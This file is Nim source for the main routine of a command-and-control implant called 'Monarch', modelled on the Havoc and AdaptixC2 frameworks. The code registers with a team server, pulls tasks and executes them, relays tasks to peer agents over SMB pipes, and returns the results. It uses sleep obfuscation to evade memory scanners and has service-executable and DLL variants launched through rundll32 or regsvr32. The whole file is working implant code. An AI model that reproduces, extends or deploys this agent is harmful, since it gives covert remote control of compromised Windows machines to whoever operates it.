import winim/lean
import times, system, random, strformat, tables
import utils/io
import core/[context, sleepmask, exit, transport, job]
import core/transport/smb
import protocol/[task, result, registration]
import ../../common/[utils, crypto, serialize]
import ../../types/[common, agent, protocol]

proc agentMain() = 
    randomize()

    # Initialize agent context
    var ctx = AgentCtx.init()
    if ctx == nil: 
        quit(0)

    #[
        Agent routine: 
        1. Sleep obfuscation
        2. Check kill date
        3. Register to the team server if not already connected
        4. Retrieve tasks via checkin request to a GET endpoint
        5. Execute task and post result
        6. If additional tasks have been fetched, go to 5.
        7. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 
        try: 
            # Sleep obfuscation to evade memory scanners
            print ""
            sleepObfuscate(ctx.sleepSettings)

            # Check kill date and exit the agent process if it is reached
            if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
                print protect("[*] Reached kill date: "), ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), protect(" (UTC).")
                print protect("[*] Exiting.") 
                exit()
            
            # Register
            if not ctx.registered: 
                # Create registration payload   
                var registration: Registration = ctx.collectAgentMetadata()
                let registrationBytes = ctx.serializeRegistrationData(registration)

                if ctx.sendData(@[uint8(1)] & uint32.toBytes(cast[uint32](registrationBytes.len())) & registrationBytes): 
                    print fmt"[+] [{ctx.agentId}] Agent registered."
                    ctx.registered = true
                else: 
                    print protect("[-] Agent registration failed.") 
                    continue

            let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
            print fmt"[*] [{date}] Checking in."

            # Check if there are results of linked agents that need to be returned
            for agentId, hPipe in ctx.links: 
                let resultBytes = ctx.smbRead(cast[HANDLE](hPipe))
                if resultBytes.len() > 0:
                    ctx.sendData(string.toBytes(resultBytes))

            # Package result data (pending jobs & task results)
            var packer = Packer.init()
            var numResults: int = 0

            # Handle tasks
            let packet: string = ctx.getTasks()
            if packet.len > 0:
                var tasks: Table[string, seq[seq[byte]]] = ctx.deserializePacket(packet)
                if tasks.len > 0:
                    var directTasks = initTable[string, seq[seq[byte]]]() 
                    var indirectPacker = Packer.init()    

                    for agentId, agentTasks in tasks:
                        # Execute tasks belonging to the current agent 
                        if agentId == ctx.agentId:
                            for task in agentTasks:
                                var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
                                let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
                                inc numResults
                                packer.addDataWithLengthPrefix(resultBytes)

                        # If the task is for a direct child it is not forwarded to all linked agents, only to the one it is for
                        elif ctx.links.hasKey(string.toUuid(agentId)): 
                            directTasks[agentId] = agentTasks

                        # Pack tasks that need to be forwarded to linked agents
                        else: 
                            indirectPacker.add(string.toUuid(agentId))
                            indirectPacker.add(cast[uint8](agentTasks.len()))
                            for task in agentTasks:
                                indirectPacker.addDataWithLengthPrefix(task)

                    # Forward direct and indirect tasks to the directly linked children
                    let indirectTasks = indirectPacker.pack()
                    for linkedAgentId in ctx.links.keys:
                        let directTasks = directTasks.getOrDefault(Uuid.toString(linkedAgentId), @[])
                        if directTasks.len() > 0 or indirectTasks.len() > 0:
                            if ctx.forward(linkedAgentId, directTasks, indirectTasks):
                                print fmt"   [+] Forwarding tasks to agent {Uuid.toString(linkedAgentId)}."

            # Handle on-going jobs
            print fmt"[*] {ctx.jobs.len()} jobs in progress." 
            ctx.handleJobs(packer, numResults)

            # Return results
            if numResults > 0:
                ctx.sendData(@[uint8(numResults)] & packer.pack())

        except CatchableError as err: 
            print protect("[-] "), err.msg

#[
    Payload type: Service Executable
    References: 
     - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/main/MainSvc.c
     - https://github.com/Adaptix-Framework/AdaptixC2/blob/main/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/main.cpp
]#
when defined(PAYLOAD_SVC):
    var
        serviceStatus: SERVICE_STATUS
        statusHandle: SERVICE_STATUS_HANDLE

    proc serviceCtrlHandler(ctrl: DWORD) {.stdcall.} =
        case ctrl
        of SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED
            serviceStatus.dwWin32ExitCode = 0
            SetServiceStatus(statusHandle, addr serviceStatus)
        of SERVICE_CONTROL_INTERROGATE:
            SetServiceStatus(statusHandle, addr serviceStatus)
        else:
            SetServiceStatus(statusHandle, addr serviceStatus)

    proc serviceMain(argc: DWORD, argv: ptr LPSTR) {.stdcall.} =
        statusHandle = RegisterServiceCtrlHandlerA("", cast[LPHANDLER_FUNCTION](serviceCtrlHandler))
        if statusHandle == 0:
            return        
        
        serviceStatus.dwServiceType = SERVICE_WIN32
        serviceStatus.dwCurrentState = SERVICE_START_PENDING
        serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_SHUTDOWN
        
        serviceStatus.dwCurrentState = SERVICE_RUNNING
        SetServiceStatus(statusHandle, addr serviceStatus)

        # Call agent routine        
        agentMain()
        
        serviceStatus.dwCurrentState = SERVICE_STOPPED
        SetServiceStatus(statusHandle, addr serviceStatus)

#[
    Payload type: DLL
    References: 
     - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/main/MainDll.c
]#
when defined(PAYLOAD_DLL):
    proc NimMain() {.cdecl, importc.}
    var gDllModule: HMODULE
    var gAgentThread: HANDLE

    proc agentThreadProc(lpParam: LPVOID): DWORD {.stdcall.} =
        agentMain()
        return 0

    # rundll32.exe monarch.dll,Start
    proc Start(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: cint) {.stdcall, exportc, dynlib.} =
        while true:
            Sleep(24 * 60 * 60 * 1000)

    # regsvr32 /s monarch.dll
    proc DllRegisterServer(): HRESULT {.stdcall, exportc, dynlib.} =
        while true:
            Sleep(24 * 60 * 60 * 1000)
        return S_OK

    proc DllMain(hinstDLL: HMODULE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc: protect("DllMain"), dynlib.} =
        case fdwReason
        of DLL_PROCESS_ATTACH:
            NimMain()
            gDllModule = hinstDLL
            discard DisableThreadLibraryCalls(hinstDLL)
            
            var threadId: DWORD = 0
            gAgentThread = CreateThread(nil, 0, agentThreadProc, nil, 0, addr threadId)
            
            return if gAgentThread != 0: TRUE else: FALSE
        
        of DLL_PROCESS_DETACH:
            if gAgentThread != 0:
                discard CloseHandle(gAgentThread)
                gAgentThread = 0
            return TRUE
        
        of DLL_THREAD_ATTACH, DLL_THREAD_DETACH:
            return TRUE
        
        else:
            return TRUE

#[
    Monarch agent entry point
]#
when isMainModule:
    
    # SVC
    when defined(PAYLOAD_SVC):
        var serviceTable: array[2, SERVICE_TABLE_ENTRYA]
        serviceTable[0].lpServiceName = ""
        serviceTable[0].lpServiceProc = cast[LPSERVICE_MAIN_FUNCTIONA](serviceMain)
        serviceTable[1].lpServiceName = NULL
        serviceTable[1].lpServiceProc = NULL
        discard StartServiceCtrlDispatcherA(addr serviceTable[0])
    
    # DLL
    when defined(PAYLOAD_DLL):
        # DLL entry point handles main function
        discard 

    # EXE
    else:
        agentMain()